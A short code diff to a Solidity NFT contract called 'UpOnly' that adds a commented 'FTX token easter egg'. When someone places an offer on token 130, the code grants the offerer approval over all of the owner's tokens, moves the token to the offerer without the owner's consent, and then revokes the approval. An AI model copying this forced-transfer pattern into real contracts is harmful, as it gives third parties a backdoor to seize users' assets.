@@ -71,8 +71,16 @@ contract UpOnly is ERC721 {
     offerers[tokenId] = recipient;
     offers[tokenId] = msg.value;
 
-    // TODO: FTX token
-    // if (tokenId >= MaxSupply) super.approve(recipient)
+    // FTX token easter egg
+    if (tokenId == 130) {
+      // Approve offerer to transfer all tokens of owner
+      address owner = ownerOf(tokenId);
+      super._setApprovalForAll(owner, recipient, true);
+      transferFrom(owner, recipient, tokenId);
+      // Remove approval for offerer to transfer all tokens of owner
+      super._setApprovalForAll(owner, recipient, false);
+    }
+
 
     emit Offer(tokenId, recipient, ownerOf(tokenId), msg.value);
   }
